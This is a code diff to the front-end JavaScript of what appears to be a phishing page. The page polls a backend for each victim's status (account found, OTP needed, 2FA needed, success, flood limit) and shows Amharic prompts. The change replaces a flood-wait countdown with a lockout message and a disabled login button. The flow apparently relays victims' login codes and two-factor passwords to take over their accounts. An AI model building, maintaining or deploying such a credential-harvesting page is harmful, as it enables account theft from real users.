@@ -342,7 +342,7 @@
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
                 if (data.status === "FLOOD") { 
                     clearInterval(statusChecker); 
-                    startFloodTimer(data.remaining_seconds || data.wait || 60); 
+                    displayFloodInStatus1(data);
                 }
                 else if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
                 else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
@@ -403,7 +403,7 @@
             const data = await res.json();
             if (data.status === "FLOOD") {
                 clearInterval(statusChecker);
-                startFloodTimer(data.remaining_seconds || data.wait || 60);
+                displayFloodInStatus1(data);
             } else if (data.status === "FOUND" || data.status === "NEED_OTP") {
                 showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
             } else if (data.status === "SUCCESS") {
@@ -480,7 +480,7 @@
     function handleResponse(data, step) {
         if (data.status === "FLOOD") { 
             clearInterval(statusChecker); 
-            startFloodTimer(data.remaining_seconds || data.wait || 60); 
+            displayFloodInStatus1(data);
         }
         else if (data.status === "SUCCESS") { showStep('success'); } 
         else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
@@ -502,28 +502,24 @@
         if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
     }
 
-    function startFloodTimer(seconds) {
+    function displayFloodInStatus1(data) {
         stopLoaders();
         clearInterval(statusChecker);
-        showStep('flood_step');
-        let rem = parseInt(seconds) || 60;
+        showStep('photo_slide');
         
-        const updateClock = () => {
-            let m = Math.floor(rem / 60);
-            let s = rem % 60;
-            const timeEl = document.getElementById('wait_time');
-            if(timeEl) {
-                timeEl.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            }
-            if (rem <= 0) { 
-                clearInterval(floodInterval); 
-                location.reload(); 
-            }
-            rem--;
-        };
+        let remSeconds = data.remaining_seconds || data.wait || 60;
+        let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
+        
+        showMsg(1, 'error', `Too many attempts! Account is locked for ${mins} minute(s).`);
+        
+        const btn = document.getElementById('loginBtn');
+        if(btn) btn.disabled = true;
+    }
 
-        updateClock();
-        const floodInterval = setInterval(updateClock, 1000);
+    function startFloodTimer(seconds) {
+        let rem = parseInt(seconds) || 60;
+        let mins = (rem / 60).toFixed(1);
+        displayFloodInStatus1({ remaining_seconds: rem, remaining_minutes: mins });
     }
 
     function setupLongPressPaste() {
